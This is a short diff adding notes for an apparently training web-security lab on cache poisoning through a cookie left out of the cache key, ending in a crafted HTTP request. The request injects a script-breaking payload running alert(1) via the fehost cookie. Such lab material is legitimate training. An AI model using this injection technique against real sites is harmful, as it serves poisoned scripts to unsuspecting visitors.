@@ -1,0 +1,12 @@
+This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. 
+An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache
+with a response that executes alert(1) in the visitor's browser.
+
+
+
+
+
+GET / HTTP/2
+Host: 0a26002e03565f7f80457bdd00e30002.web-security-academy.net
+Cookie: session=IK7tjqgw5OVhXre7uLHsZwTpkKv6Wegx; fehost=prod-cache-01</script><script>alert(1)</script>
+
